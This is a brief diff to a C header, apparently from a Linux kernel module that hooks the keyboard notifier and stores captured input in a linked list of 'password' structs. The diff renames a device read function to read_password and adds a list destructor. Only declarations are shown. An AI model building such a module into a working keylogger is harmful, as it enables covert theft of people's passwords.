@@ -55,7 +55,7 @@ static char *keymap[][2] = {
 
 // Prototypes
 struct notifier_block nb;
-ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp );
+ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp );
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data);
 int init (void);
 void cleanup(void);
@@ -67,5 +67,6 @@ struct password{//27 byte struct
 };
 
 void push(struct password** head, char* password_value);
+void ll_destructor(struct password** head);
 
 #endif
